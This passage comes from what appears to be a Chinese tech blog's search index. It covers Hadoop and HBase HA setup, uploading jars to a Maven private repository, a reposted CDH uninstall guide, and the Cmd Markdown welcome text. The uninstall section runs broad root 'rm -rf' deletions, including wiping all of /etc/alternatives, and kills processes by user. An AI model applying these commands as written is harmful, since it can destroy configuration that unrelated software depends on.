&lt;!--指定hdfs的nameservice为hn1，需要和core-site.xml中的保持一致 --&gt;&lt;property&gt;&lt;name&gt;dfs.nameservices&lt;/name&gt;&lt;value&gt;hn1&lt;/value&gt;&lt;/property&gt;&lt;!-- hn1下面有两个NameNode，分别是nn1，nn2 --&gt;&lt;property&gt;&lt;name&gt;dfs.ha.namenodes.hn1&lt;/name&gt;&lt;value&gt;nn1,nn2&lt;/value&gt;&lt;/property&gt;&lt;!-- nn1的RPC通信地址 --&gt;&lt;property&gt;&lt;name&gt;dfs.namenode.rpc-address.hn1.nn1&lt;/name&gt;&lt;value&gt;hadoop01:9000&lt;/value&gt;&lt;/property&gt;&lt;!-- nn1的http通信地址 --&gt;&lt;property&gt;&lt;name&gt;dfs.namenode.http-address.hn1.nn1&lt;/name&gt;&lt;value&gt;hadoop01:50070&lt;/value&gt;&lt;/property&gt;&lt;!-- nn2的RPC通信地址 --&gt;&lt;property&gt;&lt;name&gt;dfs.namenode.rpc-address.hn1.nn2&lt;/name&gt;&lt;value&gt;hadoop02:9000&lt;/value&gt;&lt;/property&gt;&lt;!-- nn2的http通信地址 --&gt;&lt;property&gt;&lt;name&gt;dfs.namenode.http-address.hn1.nn2&lt;/name&gt;&lt;value&gt;hadoop02:50070&lt;/value&gt;&lt;/property&gt;&lt;!-- 指定NameNode的元数据在JournalNode上的存放位置 --&gt;&lt;property&gt;&lt;name&gt;dfs.namenode.shared.edits.dir&lt;/name&gt;&lt;value&gt;qjournal://hadoop03:8485;hadoop04:8485;hadoop05:8485/hn1&lt;/value&gt;&lt;/property&gt;&lt;!-- 指定JournalNode在本地磁盘存放数据的位置 --&gt;&lt;property&gt;&lt;name&gt;dfs.journalnode.edits.dir&lt;/name&gt;&lt;value&gt;/opt/datas/hadoop/journal&lt;/value&gt;&lt;/property&gt;&lt;!-- 开启NameNode失败自动切换 --&gt;&lt;property&gt;&lt;name&gt;dfs.ha.automatic-failover.enabled&lt;/name&gt;&lt;value&gt;true&lt;/value&gt;&lt;/property&gt;&lt;!-- 配置失败自动切换实现方式 --&gt;&lt;property&gt;&lt;name&gt;dfs.client.failover.proxy.provider.hn1&lt;/name&gt;&lt;value&gt;org.apache.hadoop.hdfs.server.namenode.ha.ConfiguredFailoverProxyProvider&lt;/value&gt;&lt;/property&gt;&lt;!-- 配置隔离机制方法，多个机制用换行分割，即每个机制暂用一行--&gt;&lt;property&gt;&lt;name&gt;dfs.ha.fencing.methods&lt;/name&gt;&lt;value&gt;sshfenceshell(/bin/true)&lt;/value&gt;&lt;/property&gt;&lt;!-- 使用sshfence隔离机制时需要ssh免登陆 --&gt;&lt;property&gt;&lt;name&gt;dfs.ha.fencing.ssh.private-key-files&lt;/name&gt;&lt;value&gt;/root/.ssh/id_rsa&lt;/value&gt;&lt;/property&gt;&lt;!-- 配置sshfence隔离机制超时时间 --&gt;&lt;property&gt;&lt;name&gt;dfs.ha.fencing.ssh.connect-timeout&lt;/name&gt;&lt;value&gt;30000&lt;/value&gt;&lt;/property&gt;&lt;/configuration&gt; mapred-site.xml,配置map reduce 123456789&lt;configuration&gt;&lt;!-- 指定mr框架为yarn方式 --&gt;&lt;property&gt;&lt;name&gt;mapreduce.framework.name&lt;/name&gt;&lt;value&gt;yarn&lt;/value&gt;&lt;/property&gt;&lt;/configuration&gt; yarn-site.xml,配置yarn任务调度相关 1234567891011121314151617181920212223242526272829303132333435363738&lt;configuration&gt; &lt;!-- 开启RM高可用 --&gt; &lt;property&gt; &lt;name&gt;yarn.resourcemanager.ha.enabled&lt;/name&gt; &lt;value&gt;true&lt;/value&gt; &lt;/property&gt; &lt;!-- 指定RM的cluster id --&gt; &lt;property&gt; &lt;name&gt;yarn.resourcemanager.cluster-id&lt;/name&gt; &lt;value&gt;yrc1&lt;/value&gt; &lt;/property&gt; &lt;!-- 指定RM的名字 --&gt; &lt;property&gt; &lt;name&gt;yarn.resourcemanager.ha.rm-ids&lt;/name&gt; &lt;value&gt;rm1,rm2&lt;/value&gt; &lt;/property&gt; &lt;!-- 分别指定RM的地址 --&gt; &lt;property&gt; &lt;name&gt;yarn.resourcemanager.hostname.rm1&lt;/name&gt; &lt;value&gt;hadoop01&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;yarn.resourcemanager.hostname.rm2&lt;/name&gt; &lt;value&gt;hadoop02&lt;/value&gt; &lt;/property&gt; &lt;!-- 指定zk集群地址 --&gt; &lt;property&gt; &lt;name&gt;yarn.resourcemanager.zk-address&lt;/name&gt; &lt;value&gt;hadoop01:2181,hadoop02:2181,hadoop03:2181&lt;/value&gt; &lt;/property&gt; &lt;!-- 指定nodemanager启动时加载server的方式为shuffle server --&gt; &lt;property&gt; &lt;name&gt;yarn.nodemanager.aux-services&lt;/name&gt; &lt;value&gt;mapreduce_shuffle&lt;/value&gt; &lt;/property&gt; &lt;/configuration&gt; slaves,datanode配置 123hadoop03hadoop04hadoop05 3.2 启动3.2.1 启动journalnode 12##在slave中配置的对应主机中启动journalnode/opt/hadoop/hadoop-2.7.4/sbin/hadoop-daemon.sh start journalnode jps查看进程，出现journalnode表示成功。 3.2.2 格式化namemode 12345678910111213#在主节点上执行hdfs namenode -format#启动namenode/opt/hadoop/hadoop-2.7.4/sbin/start-dfs.sh#在备用namenode主机上执行hdfs namenode -bootstrapStandby#namenode主机上格式化zk,否则HA失效hdfs zkfc -formatZK 3.2.3 启动 dfs、yarn 123456#启动dfs/opt/hadoop/hadoop-2.7.4/sbin/start-dfs.sh#启动yarn/opt/hadoop/hadoop-2.7.4/sbin/start-yarn.sh 正常启动的进程信息: namenode: datanode: 可以查看web界面情况,访问 hadoop01:50070 如果没有正常启动,很可能是配置错误,查看日志排错.","updated":"2020-07-19T00:23:27.955Z","tags":[{"name":"hadoop","slug":"hadoop","permalink":"http://xwolf191.github.io/tags/hadoop/"}]},{"title":"上传本地jar到maven私有库","date":"2017-10-24T13:24:00.000Z","path":"2017/10/24/开发工具/上传本地jar到maven私有库/","text":"1. java maven环境变量配置,maven 私服安装 忽略 2. setting中配置nexus服务器信息 12345&lt;server&gt; &lt;id&gt;phshopping&lt;/id&gt; &lt;username&gt;admin&lt;/username&gt; &lt;password&gt;123456&lt;/password&gt;&lt;/server&gt; id: 服务idusername: 登陆maven私服的用户名password: 登陆maven私服的密码 3. 上传jar到maven私服 切换到要上传jar的目录,执行maven 命令1mvn deploy:deploy-file -DgroupId=com.ph.shopping -DartifactId=deliver-api -Dversion=1.0.0 -Dpackaging=jar -Dfile=deliver-api-1.0.jar -Durl=http://localhost:8081/repository/shopping/ -DrepositoryId=puhuishopping DgroupId: 是项目组织唯一的标识符，实际对应JAVA的包的结构，是main目录里java的目录结构。 对应maven中的配置groupId。DartifactId : 项目的唯一的标识符，实际对应项目的名称，就是项目根目录的名称。 对应maven中的配置artifactIdDversion： jar的版本信息Dfile ： 待上传目录中的文件名字Durl ： 远程的仓库地址DrepositoryId： 对应maven setting中配置的server id 4.nexus控制台查看 5. 使用方式 5.1 maven项目pom.xml配置私有仓库地址123456&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;phshopping&lt;/id&gt; &lt;url&gt;http://localhsot:8081/repository/phshopping&lt;/url&gt; &lt;/repository&gt;&lt;/repositories&gt; 5.2 引入需要依赖的jar1234567&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;tk.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mapper-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;1.1.0&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt;","updated":"2020-07-19T00:23:27.979Z","tags":[{"name":"maven","slug":"maven","permalink":"http://xwolf191.github.io/tags/maven/"}]},{"title":"CDH卸载(转)","date":"2017-10-24T10:13:00.000Z","path":"2017/10/24/大数据/CDH卸载(转)/","text":"1. 关闭集群中的所有服务。 这个可以通过clouder manger 主页关闭集群。 2. 卸载1234567891011[root@master ~]# /usr/share/cmf/uninstall-cloudera-manager.sh [root@slave1 ~]# service cloudera-scm-agent stop[root@slave1 ~]# service cloudera-scm-agent stop#一下都是所有要卸载的集群均要执行清除工作：[root@master ~]# umount /var/run/cloudera-scm-agent/process[root@slave1 ~]# umount /var/run/cloudera-scm-agent/process[root@slave2 ~]# umount /var/run/cloudera-scm-agent/process[root@master ~]# rm -rf /usr/share/cmf /var/lib/cloudera* /var/cache/yum/x86_64/6/cloudera* /var/log/cloudera* /var/run/cloudera* /etc/cloudera* 3. 卸载安装包12[root@slave1 ~]# rpm -qa | grep cloudera[root@slave2 ~]# for f in `rpm -qa | grep cloudera ` ; do rpm -e $&#123;f&#125; ; done #（如果有保存，在执行一遍） 4. 清除安装文件12345[root@master alternatives]# rm -rf /var/lib/hadoop-* /var/lib/impala /var/lib/solr /var/lib/zookeeper /var/lib/hue /var/lib/oozie /var/lib/pgsql /var/lib/sqoop2 /data/dfs/ /data/impala/ /data/yarn/ /dfs/ /impala/ /yarn/ /var/run/hadoop-*/ /var/run/hdfs-*/ /usr/bin/hadoop* /usr/bin/zookeeper* /usr/bin/hbase* /usr/bin/hive* /usr/bin/hdfs /usr/bin/mapred /usr/bin/yarn /usr/bin/sqoop* /usr/bin/oozie /etc/hadoop* /etc/zookeeper* /etc/hive* /etc/hue /etc/impala /etc/sqoop* /etc/oozie /etc/hbase* /etc/hcatalog #只删除hadoop系列的，不要删除其他软件的，否则其他软件的版本控制会被破坏[root@master alternatives]# rm -rf ` find /var/lib/alternatives/* ! -name \"mta\" ! -name \"print\" ! -name \"zlibrary-ui\" -mtime -3` [root@master alternatives]# rm -rf /etc/alternatives/* 5. 杀死相关进程：1for u in hdfs mapred cloudera-scm hbase hue zookeeper oozie hive impala flume; do sudo kill $(ps -u $u -o pid=); done 6. 删除parcel包分发文件和解压文件1rm -rf /opt/cloudera/parcel-cache /opt/cloudera/parcels 到此卸载完毕。转自: CDH5.X完全卸载步骤","updated":"2020-07-19T00:23:27.952Z","tags":[{"name":"hadoop","slug":"hadoop","permalink":"http://xwolf191.github.io/tags/hadoop/"}]},{"title":"Hbase HA 环境搭建","date":"2017-10-24T03:18:00.000Z","path":"2017/10/24/大数据/Hbase HA 环境搭建/","text":"一、JAVA安装环境变量配置 shellcode1234567891011121314151617#安装rpm -ivh jdk-8u144-linux-x64.rpm# 配置环境变量vi /etc/profile#新增如下内容export JAVA_HOME=/usr/java/jdk1.8.1_44/export PATH=$JAVA_HOME/bin:$PATHexport CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar#生效source /etc/profile#验证java -version 二、Hadoop 环境搭建 参考： Haoop HA 环境搭建 三、Hbase 安装配置 3.1 基础配置 hbase-env.sh 123456789#java路径export JAVA_HOME=#hbase classpathexport HBASE_CLASSPATH=/opt/hadoop/hbase-1.3.1/lib# 不用hbase自己的实例来管理ZKexport HBASE_MANAGES_ZK=false hbase-site.xml 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;configuration&gt;&lt;!--开启分布式--&gt;&lt;property&gt;&lt;name&gt;hbase.cluster.distributed&lt;/name&gt;&lt;value&gt;true&lt;/value&gt;&lt;/property&gt;&lt;property&gt;&lt;!--hdfs数据目录--&gt;&lt;name&gt;hbase.rootdir&lt;/name&gt;&lt;value&gt;hdfs://hadoop01:9000/hbase&lt;/value&gt;&lt;/property&gt;&lt;!-- zk 集群信息--&gt;&lt;property&gt;&lt;name&gt;hbase.zookeeper.quorum&lt;/name&gt;&lt;value&gt;hadoop01,hadoop02,hadoop03&lt;/value&gt;&lt;/property&gt; &lt;property&gt;&lt;name&gt;hbase.zookeeper.sission.timeout&lt;/name&gt;&lt;value&gt;60000&lt;/value&gt;&lt;/property&gt;&lt;!--zk 端口--&gt;&lt;property&gt;&lt;name&gt;hbase.zookeeper.property.clientPort&lt;/name&gt;&lt;value&gt;2181&lt;/value&gt;&lt;/property&gt;&lt;property&gt;&lt;name&gt;hbase.zookeeper.property.dataDir&lt;/name&gt;&lt;value&gt;/opt/datas/hbase/zookeeper&lt;/value&gt;&lt;/property&gt;&lt;/configuration&gt; regionserver 123hadoop03hadoop04hadoop05 backup-masters，备份主机12hadoop01hadoop02 至此配置成功，将文件夹分发到其他服务器上。 3.2 可能出现的问题3.2.1 org.apache.hadoop.hbase.ipc.RemoteWithExtrasException(org.apache.hadoop.hbase.ClockOutOfSyncException): org.apache.hadoop.hbase.ClockOutOfSyncException: Server hadoop04,16020,1509015701557 has been rejected; Reported time is too far out of sync with master. Time difference of 86399223ms &gt; max allowed of 30000ms 服务器时间不同步造成的，安装ntp同步. 3.2.2 Failed to become active master org.apache.hadoop.ipc.RemoteException(org.apache.hadoop.ipc.StandbyException): Operation category READ is not supported in state standby 将当前Hadoop NameNode节点更改为Active状态即可 四、Hbase shell 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374#启动Hadoop,hbase,进入hbase shell 交互界面/opt/hadoop/hbase-1.3.1/hbase shell#版本信息hbase(main):001:0&gt; version1.3.1, r930b9a55528fe45d8edce7af42fef2d35e77677a, Thu Apr 6 19:36:54 PDT 2017#集群状态hbase(main):002:0&gt; status 1 active master, 1 backup masters, 2 servers, 0 dead, 1.0000 average load#create 创建表hbase(main):003:0&gt; create 'user','id','name','age'0 row(s) in 7.2540 seconds=&gt; Hbase::Table - user#describe,查看表结构hbase(main):004:0&gt; describe 'user'Table user is ENABLED user COLUMN FAMILIES DESCRIPTION &#123;NAME =&gt; 'age', BLOOMFILTER =&gt; 'ROW', VERSIONS =&gt; '1', IN_MEMORY =&gt; 'false', KEEP_DELETED_CELLS =&gt; 'FALSE', DATA_BLOCK_ENCODING =&gt; 'NONE', TTL =&gt; 'FOREVER', COMPRESSION =&gt; 'NONE', MIN_VERSIONS =&gt; '0', BLOCKCACHE =&gt; 'true', BLOCKSIZE =&gt; '65536', REPLICATION_SCOPE =&gt; '0'&#125; &#123;NAME =&gt; 'id', BLOOMFILTER =&gt; 'ROW', VERSIONS =&gt; '1', IN_MEMORY =&gt; 'false', KEEP_DELETED_CELLS =&gt; 'FALSE', DATA_BLOCK_ENCODING =&gt; 'NONE', TTL =&gt; 'FOREVER', COMPRESSION =&gt; 'NONE', MIN_VERSIONS =&gt; '0', BLOCKCACHE =&gt; 'true', BLOCKSIZE =&gt; '65536', REPLICATION_SCOPE =&gt; '0'&#125; &#123;NAME =&gt; 'name', BLOOMFILTER =&gt; 'ROW', VERSIONS =&gt; '1', IN_MEMORY =&gt; 'false', KEEP_DELETED_CELLS =&gt; 'FALSE', DATA_BLOCK_ENCODING =&gt; 'NONE', TTL =&gt; 'FOREVER', COMPRESSION =&gt; 'NONE', MIN_VERSIONS =&gt; '0', BLOCKCACHE =&gt; 'true', BLOCKSIZE =&gt; '65536', REPLICATION_SCOPE =&gt; '0'&#125; 3 row(s) in 3.8890 seconds#put,添加数据hbase(main):007:0&gt; put 'user','row1','age:y','13'0 row(s) in 0.0220 secondshbase(main):008:0&gt; put 'user','row1','name:a','...德'0 row(s) in 0.0270 seconds#scan ,查看数据hbase(main):009:0&gt; scan 'user'ROW COLUMN+CELL row1 column=age:y, timestamp=1509012964601, value=13 row1 column=id:, timestamp=1509012933471, value=1 row1 column=name:a, timestamp=1509012990136, value=\\xE7\\xBA\\xB3\\xE5\\x85\\xB0\\xE6\\x80\\xA7\\xE5\\xBE\\xB7 1 row(s) in 0.0320 seconds#get ,获取第一行数据hbase(main):011:0&gt; get 'user','row1'COLUMN CELL age:y timestamp=1509012964601, value=13 id: timestamp=1509012933471, value=1 name:a timestamp=1509012990136, value=\\xE7\\xBA\\xB3\\xE5\\x85\\xB0\\xE6\\x80\\xA7\\xE5\\xBE\\xB7 1 row(s) in 0.0410 seconds#exists ,表是否存在hbase(main):010:0&gt; exists 'a'Table a does not exist 0 row(s) in 0.0480 seconds#disable,禁用表hbase(main):012:0&gt; disable 'user'0 row(s) in 2.7300 seconds#删除表hbase(main):013:0&gt; drop 'user'0 row(s) in 1.2870 secondshbase(main):014:0&gt; listTABLE 0 row(s) in 0.0100 seconds=&gt; []","updated":"2020-07-19T00:23:27.956Z","tags":[{"name":"hbase","slug":"hbase","permalink":"http://xwolf191.github.io/tags/hbase/"}]},{"title":"Cmd Markdown 编辑阅读器","date":"2017-10-23T05:32:00.000Z","path":"2017/10/23/开发工具/Cmd Markdown 编辑阅读器/","text":"我们理解您需要更便捷更高效的工具记录思想，整理笔记、知识，并将其中承载的价值传播给他人，Cmd Markdown 是我们给出的答案 —— 我们为记录思想和分享知识提供更专业的工具。 您可以使用 Cmd Markdown： 整理知识，学习笔记 发布日记，杂文，所见所想 撰写发布技术文稿（代码支持） 撰写发布学术论文（LaTeX 公式支持） 除了您现在看到的这个 Cmd Markdown 在线版本，您还可以前往以下网址下载： Windows/Mac/Linux 全平台客户端 请保留此份 Cmd Markdown 的欢迎稿兼使用说明，如需撰写新稿件，点击顶部工具栏右侧的 新文稿 或者使用快捷键 Ctrl+Alt+N。 什么是 MarkdownMarkdown 是一种方便记忆、书写的纯文本标记语言，用户可以使用这些标记符号以最小的输入代价生成极富表现力的文档：譬如您正在阅读的这份文档。它使用简单的符号标记不同的标题，分割不同的段落，粗体 或者 斜体 某些文字，更棒的是，它还可以 1. 制作一份待办事宜 Todo 列表 [ ] 支持以 PDF 格式导出文稿 [ ] 改进 Cmd 渲染算法，使用局部渲染技术提高渲染效率 [x] 新增 Todo 列表功能 [x] 修复 LaTex 公式渲染问题 [x] 新增 LaTex 公式编号功能 2. 书写一个质能守恒公式LaTeXE=mc^23. 高亮一段代码code1234567@requires_authorizationclass SomeClass: passif __name__ == '__main__': # A comment print 'hello world' 4. 高效绘制 流程图12345678st=&gt;start: Startop=&gt;operation: Your Operationcond=&gt;condition: Yes or No?e=&gt;endst-&gt;op-&gt;condcond(yes)-&gt;econd(no)-&gt;op 5. 高效绘制 序列图123Alice-&gt;Bob: Hello Bob, how are you?Note right of Bob: Bob thinksBob--&gt;Alice: I am good thanks! 6. 高效绘制 甘特图12345678910111213title 项目开发流程section 项目确定 需求分析 :a1, 2016-06-22, 3d 可行性报告 :after a1, 5d 概念验证 : 5dsection 项目实施 概要设计 :2016-07-05 , 5d 详细设计 :2016-07-08, 10d 编码 :2016-07-15, 10d 测试 :2016-07-22, 5dsection 发布验收 发布: 2d 验收: 3d 7. 绘制表格 项目 价格 数量 计算机 $1600 5 手机 $12 12 管线 $1 234 8. 更详细语法说明想要查看更详细的语法说明，可以参考我们准备的 Cmd Markdown 简明语法手册，进阶用户可以参考 Cmd Markdown 高阶语法手册 了解更多高级功能。 总而言之，不同于其它 所见即所得 的编辑器：你只需使用键盘专注于书写文本内容，就可以生成印刷级的排版格式，省却在键盘和工具栏之间来回切换，调整内容和格式的麻烦。Markdown 在流畅的书写和印刷级的阅读体验之间找到了平衡。 目前它已经成为世界上最大的技术分享网站 GitHub 和 技术问答网站 StackOverFlow 的御用书写格式。 什么是 Cmd Markdown您可以使用很多工具书写 Markdown，但是 Cmd Markdown 是这个星球上我们已知的、最好的 Markdown 工具——没有之一 ：）因为深信文字的力量，所以我们和你一样，对流畅书写，分享思想和知识，以及阅读体验有极致的追求，我们把对于这些诉求的回应整合在 Cmd Markdown，并且一次，两次，三次，乃至无数次地提升这个工具的体验，最终将它演化成一个 编辑/发布/阅读 Markdown 的在线平台——您可以在任何地方，任何系统/设备上管理这里的文字。 1. 实时同步预览我们将 Cmd Markdown 的主界面一分为二，左边为编辑区，右边为预览区，在编辑区的操作会实时地渲染到预览区方便查看最终的版面效果，并且如果你在其中一个区拖动滚动条，我们有一个巧妙的算法把另一个区的滚动条同步到等价的位置，超酷！ 2. 编辑工具栏也许您还是一个 Markdown 语法的新手，在您完全熟悉它之前，我们在 编辑区 的顶部放置了一个如下图所示的工具栏，您可以使用鼠标在工具栏上调整格式，不过我们仍旧鼓励你使用键盘标记格式，提高书写的流畅度。 3. 编辑模式完全心无旁骛的方式编辑文字：点击 编辑工具栏 最右侧的拉伸按钮或者按下 Ctrl + M，将 Cmd Markdown 切换到独立的编辑模式，这是一个极度简洁的写作环境，所有可能会引起分心的元素都已经被挪除，超清爽！ 4. 实时的云端文稿为了保障数据安全，Cmd Markdown 会将您每一次击键的内容保存至云端，同时在 编辑工具栏 的最右侧提示 已保存 的字样。无需担心浏览器崩溃，机器掉电或者地震，海啸——在编辑的过程中随时关闭浏览器或者机器，下一次回到 Cmd Markdown 的时候继续写作。 5. 离线模式在网络环境不稳定的情况下记录文字一样很安全！在您写作的时候，如果电脑突然失去网络连接，Cmd Markdown 会智能切换至离线模式，将您后续键入的文字保存在本地，直到网络恢复再将他们传送至云端，即使在网络恢复前关闭浏览器或者电脑，一样没有问题，等到下次开启 Cmd Markdown 的时候，她会提醒您将离线保存的文字传送至云端。简而言之，我们尽最大的努力保障您文字的安全。 6. 管理工具栏为了便于管理您的文稿，在 预览区 的顶部放置了如下所示的 管理工具栏： 通过管理工具栏可以： &lt;/i&gt; 发布：将当前的文稿生成固定链接，在网络上发布，分享 新建：开始撰写一篇新的文稿&lt;/i&gt; 删除：删除当前的文稿 导出：将当前的文稿转化为 Markdown 文本或者 Html 格式，并导出到本地&lt;/i&gt; 列表：所有新增和过往的文稿都可以在这里查看、操作 模式：切换 普通/Vim/Emacs 编辑模式 7. 阅读工具栏 通过 预览区 右上角的 阅读工具栏，可以查看当前文稿的目录并增强阅读体验。 工具栏上的五个图标依次为： &lt;/i&gt; 目录：快速导航当前文稿的目录结构以跳转到感兴趣的段落 视图：互换左边编辑区和右边预览区的位置&lt;/i&gt; 主题：内置了黑白两种模式的主题，试试 黑色主题，超炫！ 阅读：心无旁骛的阅读模式提供超一流的阅读体验 全屏：简洁，简洁，再简洁，一个完全沉浸式的写作和阅读环境 8. 阅读模式在 阅读工具栏 点击 或者按下 Ctrl+Alt+M 随即进入独立的阅读模式界面，我们在版面渲染上的每一个细节：字体，字号，行间距，前背景色都倾注了大量的时间，努力提升阅读的体验和品质。 9. 标签、分类和搜索在编辑区任意行首位置输入以下格式的文字可以标签当前文档： 标签： 未分类 标签以后的文稿在【文件列表】（Ctrl+Alt+F）里会按照标签分类，用户可以同时使用键盘或者鼠标浏览查看，或者在【文件列表】的搜索文本框内搜索标题关键字过滤文稿，如下图所示： 10. 文稿发布和分享在您使用 Cmd Markdown 记录，创作，整理，阅读文稿的同时，我们不仅希望它是一个有力的工具，更希望您的思想和知识通过这个平台，连同优质的阅读体验，将他们分享给有相同志趣的人，进而鼓励更多的人来到这里记录分享他们的思想和知识，尝试点击 (Ctrl+Alt+P) 发布这份文档给好友吧！ 再一次感谢您花费时间阅读这份欢迎稿，点击 (Ctrl+Alt+N) 开始撰写新的文稿吧！祝您在这里记录、阅读、分享愉快！ 作者 @ghosert2016 年 07月 07日 LaTeX. 支持 LaTeX 编辑显示支持，例如：$\\sum_{i=1}^n a_i=0$， 访问 MathJax 参考更多使用方法。 &#8617; code. 代码高亮功能支持包括 Java, Python, JavaScript 在内的，四十一种主流编程语言。 &#8617;","updated":"2020-07-19T00:23:27.967Z","tags":[{"name":"markdown","slug":"markdown","permalink":"http://xwolf191.github.io/tags/markdown/"}]}]